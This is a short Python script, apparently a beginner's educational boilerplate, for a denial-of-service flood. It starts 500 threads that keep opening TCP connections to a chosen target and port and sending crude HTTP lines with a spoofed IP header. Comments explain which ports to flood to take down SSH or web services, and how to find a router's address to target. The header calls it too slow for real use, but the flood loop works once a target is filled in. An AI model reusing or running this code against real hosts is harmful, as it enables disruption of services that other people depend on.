# NOTE- This is a just basic boilerplate how a DDOS attack can be Done though this script cannot be used for actual DDOS attacks because it is slow and We are not sending heavy data.

import threading
import socket

# Threading is the way we can perform tasks in parallel fashion.

# target can be IP address or domain name
# to test can run apache server in your own system then ddos that or your website or your router
# to see your router IP go to cmd->ipconfig -> wireless LAN adapter wi-fi here IPv4 address  is the IP that you are using in your own network/home and then your default gateway is the router IP one you want to target.

# Port on which we are DDOSing matters
# say u are attacking port 22 it refers to SSH/terminal service , 80 port DDOSing will target the http service so web interface might be down.
# so one needs to know which service they want to DDOS and have knowledge to which service that port is providing that service that we want to break.

target = ''
port =

# Note by providing just a random fake_ip would not make u anonymous in the header to actually make it work u need anonymous kinda tools.

fake_ip= '102.21.20.32'

# to track the number of times the request made.
already_connected=0

def attack():
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creating a socket via AF_INET address family specifying tcp protocol SOCK_STREAM

        # the below steps are basically connecting, sending closing this goes on.
        s.connect((target,port))

        s.sendto(("GET /"+target+" HTTP/1.1\r\n").encode("ascii"), (target ,port))
        s.sendto(("POST: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

        # to see after every 500 threads execution request.
        global already_connected
        already_connected+=1
        if already_connected%500==0:
            print(already_connected)

# Config Threads to run the attack function
rg=500#a number basically number of threads
for i in range(rg):
    thread=threading.Thread(target=attack)
    thread.start()
